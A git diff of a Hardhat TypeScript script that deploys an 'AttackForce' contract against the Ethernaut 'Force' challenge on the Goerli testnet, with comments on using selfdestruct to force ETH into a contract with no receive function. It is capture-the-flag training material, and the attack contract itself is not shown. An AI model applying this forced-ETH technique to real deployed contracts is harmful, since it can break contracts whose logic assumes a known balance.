@@ -3,14 +3,43 @@ import { ethers } from "hardhat";
 const attackForce = async () => {
     // change contract addresses here.
     const forceAddress = "0xc3C0633aAff54368AE13c2097832D0f3E43F75a9"; //type "await contract.address()" in ethernaut console
-    // attackForce address = "0xA5543a41048CF3b45c971EA6933325a25F0083A2";
+    const args: [] = [];
+    const deployer = process.env.PRIVATE_KEY || "";
+    // [deployer] = await ethers.getSigners();
 
     // Don't touch below 🚀
     // You can use seldestrcut contract to send ETH to a contract with no receive function or fallback()
     // Additional read to understand more on selfdestruct:
     // https://docs.soliditylang.org/en/v0.6.0/units-and-global-variables.html#contract-related
+
+    // deploying attack contract here
+    // const deployed = await deployContract(hre, "EternalKing", args);
+    // alternative below
+    console.log("Deploying attack contract AttackForce...");
+    const Factory = await ethers.getContractFactory("AttackForce", deployer);
+    const attackForce = await Factory.deploy();
+    console.log(attackForce);
+    console.log(`Contract deployed to ${attackForce.address}`);
+    console.log("Attack contract deployed...");
+    // experimantal verify below
+    // if (eternalKing.address){
+    //     console.log("Verifying contract...");
+    //     try {
+    //         await run("verify:verify", {
+    //             address: eternalKing.address,
+    //             constructorArguments: args,
+    //         });
+    //     } catch (e: any) {
+    //         if (e.message.toLowerCase().includes("already verified")) {
+    //             console.log("Already verified!");
+    //         } else {
+    //             console.log(e);
+    //         }
+    //     }
+    // }
+
     // typing all commands in console below
-    const attack = await ethers.getContract("AttackForce");
+    const attack = await ethers.getContractAt("AttackForce", attackForce.address);
     const provider = ethers.getDefaultProvider("goerli");
     const oldContractBalance = ethers.utils.formatEther(await provider.getBalance(forceAddress));
     console.log(`Force contract balance is: ${oldContractBalance} ETH`);
